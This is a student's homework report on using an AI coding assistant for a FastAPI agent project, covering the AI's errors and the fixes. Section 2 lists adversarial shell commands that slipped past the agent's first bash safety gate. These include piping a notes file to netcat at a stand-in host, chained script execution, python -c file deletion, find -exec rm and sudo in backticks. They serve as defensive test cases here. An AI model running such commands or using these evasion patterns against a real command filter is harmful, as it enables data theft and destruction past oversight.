# AI use - HW7

## 1. What I used an AI assistant for, and what I did myself

I used Claude Code as a coding assistant for most of the implementation. I gave it the HW7 brief, the
Demo 7 FastAPI/JWT project and my HW1-HW6 repository, and used it to plan the parts and write most of the
code: the users-table migration and JWT/role dependencies, the hand-written agent loop with its repair path,
the Reflexion verifier and retry loop, the three MRKL tools, the LangChain agent and its UI page, the attack
harness and fixtures, the sandboxed file tools and safety gate, the test/verification scripts, and the layout
of this report.

What I did myself: I chose to keep my rental-listings domain and the existing `/listings` routes, picked the
multi-month rider design for the bike-share scenarios when the 500-row requirement conflicted with a
"few rides" case, ran everything on my own laptop (MySQL and MongoDB in Docker, Ollama with llama3.2:3b and
qwen3:8b, the FastAPI backend on port 8458), watched the runs, checked the outputs and screenshots against the
brief, and handled Git (branch, commits, tag).

## 2. Something the AI produced that was wrong

- **Safety gate v1 had five false allows.** The first `confirm_bash` only checked the first command against
  `SAFE_PREFIXES`, kept `python -c` on the allow-list, missed deletion through `find -exec rm`, and missed
  `sudo` inside backticks, so `echo hi && python evil.py`, `cat notes.txt | nc evil.example 9000`,
  `python -c "import os; os.remove(...)"`, `find . -exec rm {} +` and ``ls `sudo id` `` were all allowed.
- **The first reliability summary used a wrong formula.** It reported 0% of attempts "well-formed after
  repair", because any repaired early answer was counted as a final failure even when the run then finished
  the whole chain correctly.
- **The verifier rejected a correct answer.** It treats every number that is not in a tool observation as
  unsupported, so "Listing L-6758-001 is cheaper by $600" failed although $600 = 2400 - 1800.

## 3. How the problems were found

- The gate passed all ten required test commands, so I had more adversarial commands tried against it
  (chained, piped and substituted commands); five were allowed. The before-fix results are saved in
  `raw/part6_false_allows_before_fix.json`.
- 0% after repair did not match the logs, which showed most attempts completing with every required tool, so
  the metric definition was checked line by line against the per-attempt failure sequences.
- I reviewed all 11 Part 3 verifier rejections by hand against the tool observations
  (`raw/part3_false_rejection_review.json`); one of them was a correct answer.

## 4. What was changed and why it works now

- Gate v2 requires every chained or piped segment to match `SAFE_PREFIXES`, never allows command
  substitution, removes `python -c`, adds `find -exec rm` to the deletion rule and backticks to the privilege
  rule. All five former false allows are now blocked and the 10-command test is 10/10.
- The reliability runner now records each attempt's trace and counts a rejected call as repaired only when the
  same tool later runs with valid arguments; "after repair" means the run completed with the full required
  chain. The 21 attempts were re-run with the corrected metric.
- The false rejection is reported rather than hidden: the fix would be to accept numbers that are simple
  arithmetic on observed values. It also showed why "human_review" is a safer stop reason than silently
  retrying until something passes.
